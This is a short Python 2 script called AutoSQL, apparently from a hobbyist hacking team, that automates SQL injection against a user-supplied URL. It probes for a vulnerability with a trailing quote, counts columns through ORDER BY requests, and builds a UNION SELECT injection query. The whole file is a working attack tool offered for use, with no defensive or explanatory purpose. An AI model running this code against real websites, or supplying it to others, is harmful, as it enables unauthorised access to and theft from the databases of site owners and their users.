# -*- coding: utf-8 -*-
try:
 import os,requests, inquirer, time
except ImportError: os.system("pip2 install requests inquirer;python2 %s"%os.path.basename(__file__))
def AutoSQL(url):
 print "%s[%s!%s] %sTarget : %s%s"%(pu,ku,pu,pu,ku,url) 
 print "%s[%s!%s] %sChecking vuln or not..."%(pu,ku,pu,pu)
 while True:
  my = requests.get(url+"'")
  my2 = requests.get(url+"'--+-")
  if "You have an error in your SQL" in my.text and "You have an error in your SQL" not in my2.text:
   break
  else: exit("%s[%s!%s] %sTarget is not vuln!"%(pu,ku,pu,me))
 print "%s[%s!%s] %sYes, target is vuln!"%(pu,ku,pu,hi)
 no1 = 1
 jum_kolom = 0
 result = []
 print "%s[%s!%s] %sCount the number of columns..."%(pu,ku,pu,pu)
 while True:
  uw = url+"'+order+by+"+str(no1)+"--+-"
  u = requests.get(uw)
  if "Unknown column" in u.text:
   print "%s[%s!%s] %s%s"%(pu,ku,pu,me,uw)
   break
  else: print "%s[%s!%s] %s%s"%(pu,ku,pu,hi,uw)
  no1 += 1
  jum_kolom += 1
  result.append(jum_kolom)
 print "%s[%s!%s] %sNumber of columns : %s"%(pu,ku,pu,pu,jum_kolom)
 result = url+"'union+select+"+",".join(map(str,result))+"--+-"
 print "%s[%s!%s] %sResult Query : %s%s"%(pu,ku,pu,pu,ku,result)

qu = '\033[0;36m'
hi = '\033[0;32m'
pu = '\033[0;37m'
me = '\033[0;31m'
ku = '\033[0;33m'
print """%s
╔═╗┬ ┬┌┬┐┌─┐╔═╗╔═╗ ╦   %sAuthor by %sabilseno11%s
╠═╣│ │ │ │ │╚═╗║═╬╗║   %sGithub %sgithub.com/AbilSeno%s
╩ ╩└─┘ ┴ └─┘╚═╝╚═╝╚╩═╝ %sTeam %sanoncybfakeplayer%s
"""%(me,qu,ku,pu,qu,ku,me,qu,ku,me)
uwu = [
  inquirer.List('pilih',
                message="Choose a option",
                choices=['1. Start','2. Exit'],
            ),
]
answers = inquirer.prompt(uwu)
if answers["pilih"] == "1. Start":
 url = raw_input("%s[%s?%s] %sEnter a url : %s"%(pu,ku,pu,qu,pu))
 AutoSQL(url)
if answers["pilih"] == "2. Exit":
 exit()

